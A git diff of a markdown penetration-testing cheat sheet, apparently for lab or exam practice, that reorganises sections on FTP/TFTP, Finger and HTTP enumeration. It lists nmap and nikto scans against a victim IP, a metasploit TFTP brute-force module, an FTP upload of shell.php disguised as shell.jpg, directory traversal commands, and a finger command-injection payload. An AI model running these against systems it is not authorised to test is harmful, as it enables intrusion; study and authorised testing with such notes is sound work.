@@ -9,7 +9,12 @@
   - [DNSrecon](#DNSrecon)
   - [DNSEnum](#DNSEnum)
   - [Zone_transfer_description](#Zone_transfer_description)
-- [FTP/TFTP](#FTP)
+- [FTP/TFTP](#FTP/TFTP)
+  - [nmap ftp scan](#nmap_ftp_scan)
+  - [metasploit tftp](#metasploit_tftp)
+  - [Upload_attemps](#Upload attemps)
+  - [FTP path traversal](path_traversal)
+  - [Windows dir change](#Windows_dir_change_with_~1)
 - [Finger](#Finger)
 - [HTTP](#HTTP)
 - [SQL](#SQL)
@@ -121,54 +126,51 @@ CNAME Records: Gives an alias of one name to another.
 A Records: Give us IP-address for a particular domain
 
 --------------------------------------------------------------------------------------------------------------------------------
-## FTP:
+# FTP/TFTP
 
-#### nmap ftp scan:
+## nmap_ftp_scan:
 - nmap -p 21 -sV [victim_ip]
 - nmap -sV -sC [victim_ip] -p 21
 - namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
 - nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21] 127.0.0.1
-
-##### nmap tftp scan:
 - nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
 - nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]
 
-##### metasploit tftp
+## metasploit_tftp
 - use auxiliary/scanner/tftp/tftpbrute
 
-##### Upload attemps
+## Upload_attemps
 - ftp> put shell.php shell.jpg
 - ftp> PUT shell.php shell.jpg
 - ftp> send 
     (local-file) shell.php
     (remote-file) shell.jpg
     
-##### File Traversal
+## path_traversal
 - dir ../
 - ls ../
 
-##### Windows dir change with ~1
+## Windows_dir_change_with_~1
 - cd /Docume~1/
 - cd /Progra~1/
 --------------------------------------------------------------------------------------------------------------------------------
-## Finger
+# Finger
 
-### user enumeration usefull script
+## user enumeration usefull script
 - https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl
 
-#### finger comandline 
+## finger comandline 
 ```
 finger [username]@[ip]
 ```
-
-####
+##
 ```
 finger "|/bin/ls -a /@[victim_ip]"
 ```
 --------------------------------------------------------------------------------------------------------------------------------
-## HTTP 
+# HTTP 
 
-##### Directory scanning
+## Directory scanning
 - dir mode
   - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
 - dns mode
@@ -187,7 +189,7 @@ finger "|/bin/ls -a /@[victim_ip]"
 - proxy chain
   -  gobuster -o gobuster.txt -e -u http://10.11.1.x/ -w ~/wordlist/shortlist.txt
   
-##### Nikto scan
+## Nikto scan
 - nikto -h [victim_ip]
 - nikto -Display V -h [victim_ip]
 - nikto -Display V -o results.html -Format htm -h [victim_ip]
@@ -207,21 +209,21 @@ b – Software Identification
 c – Remote Source Inclusion
 x – Reverse Tuning Options (i.e., include all except specified)
 ```
-###### Only number 9 - SQL injection
+## Only number 9 - SQL injection
 ```
 nikto -Tuning 9 -h [victim_ip]6
 ```
 
-###### Everything except number 6 - DOS
+## Everything except number 6 - DOS
 ```
 nikto -Tuning x 6 -h [victim_ip]
 ```
 
-#### WhatWeb
+## WhatWeb
 **Another enum type tool like nikto but looks to be more advanced and prettier in output**
 - whatweb -v -a 4 http://[victim_ip]
 
-#### Cewl
+## Cewl
 - create dict via https://tools.kali.org/password-attacks/cewl and use as dirb list scan
 --------------------------------------------------------------------------------------------------------------------------------
 ## SQL
